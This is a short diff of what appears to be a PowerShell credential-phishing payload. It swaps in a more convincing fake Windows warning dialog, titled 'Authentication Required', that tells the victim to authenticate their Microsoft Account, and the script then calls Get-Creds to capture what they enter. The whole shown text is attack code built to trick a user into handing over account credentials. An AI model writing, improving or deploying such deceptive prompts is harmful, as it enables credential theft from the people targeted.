@@ -118,9 +118,13 @@ Pause-Script
 
 Caps-Off
 
-Add-Type -AssemblyName System.Windows.Forms
-
-[System.Windows.Forms.MessageBox]::Show("Unusual sign-in. Please authenticate your Microsoft Account")
+Add-Type -AssemblyName PresentationCore,PresentationFramework
+$msgBody = "Please authenticate your Microsoft Account."
+$msgTitle = "Authentication Required"
+$msgButton = 'Ok'
+$msgImage = 'Warning'
+$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+Write-Host "The user clicked: $Result"
 
 $creds = Get-Creds
 
